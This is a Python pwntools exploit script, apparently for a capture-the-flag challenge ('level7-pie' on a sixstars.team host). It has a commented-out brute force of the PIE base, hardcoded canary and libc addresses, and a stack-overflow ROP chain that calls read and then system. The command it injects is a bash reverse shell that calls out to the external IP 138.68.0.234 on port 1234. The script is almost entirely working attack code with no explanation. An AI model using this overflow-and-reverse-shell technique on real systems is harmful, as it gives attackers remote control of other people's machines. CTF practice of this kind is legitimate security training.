from pwn import *
context.log_level="debug"

r=remote("pwn.sixstars.team",22007)
elf=ELF("./level7-pie")
libc=ELF("./libc-2.23.so")

r.recv()

canary=0x99efe500
retaddr=0x5661315f
"""
for j in range(3):
    for i in range(256):
        if i==10:
            continue
        r=remote("pwn.sixstars.team",22007)
        r.recv()
        sh='a'*0x40+p32(canary)+'e'*0xc+pie+chr(i)    #p32(canary)+'a'*0x8+'a'*0x4+pie+chr(i)
        try:
            r.sendline(sh)
            r.recv()
        except:
            r.close()
        else:
            pie+=chr(i)
            r.close()
            break;

print hex(u32(pie))
"""

pie=retaddr-0x115F
send=pie+elf.got['send']
write=pie+0x0000F04
libc.address=0xf761e000
read=pie+0x0000DDA
pop=pie+0x00001229
bss=pie+0x3800

sys=libc.sym['system']

#sh='a'*0x40+p32(canary)+'e'*0xc+p32(write)+p32(0)+p32(4)+p32(send)
sh='a'*0x40+p32(canary)+'e'*0xc+p32(read)+p32(pop)+p32(4)+p32(bss)+p32(53)+p32(sys)+p32(0)+p32(bss)

r.sendline(sh)
r.send('bash -c "bash -i >& /dev/tcp/138.68.0.234/1234 0>&1"')

r.interactive()
